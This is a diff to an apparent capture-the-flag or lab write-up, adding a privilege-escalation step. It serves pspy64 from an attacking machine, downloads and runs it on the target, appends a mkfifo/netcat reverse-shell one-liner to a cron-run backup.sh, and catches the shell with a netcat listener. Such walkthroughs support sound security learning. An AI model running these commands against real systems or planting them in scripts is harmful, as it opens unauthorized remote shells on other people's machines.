@@ -213,11 +213,32 @@ I couldn't crack those passwords, so as a last resort I tried to ssh into the ma
 ![](attachments/Pasted%20image%2020251125184328.png)
 
 
-In my attacking machine I downloaded `pspy` and then I opened a python server into that directory `/usr/share/pspy`
+In my attacking machine I downloaded `pspy64` from the github `https://github.com/DominicBreuker/pspy?tab=readme-ov-file` and then I opened a python server into that directory `/Downloads'
 ```bash
-apt install pspy
-cd /usr/share/pspy
 python3 -m http.server 8003
 ```
 
-and we see 
+and then at the targeting machine I downloaded the file and execute it:
+```bash
+wget http://192.168.126.129:8003/pspy64
+chmod +x pspy64
+./pspy64
+```
+
+and we see from the results that the `backup.sh` is running
+
+![](attachments/Pasted%20image%2020251125185701.png)
+
+so I put in the `backup.sh` a one-liner reverse shell:
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.126.129 1234 >/tmp/f" >> backup.sh
+```
+
+and on the attacking machine I opened a `netcat`
+```bash
+nc -lvnp 1234
+```
+
+and after a minute I got a shell:
+
+![](attachments/Pasted%20image%2020251125185917.png)
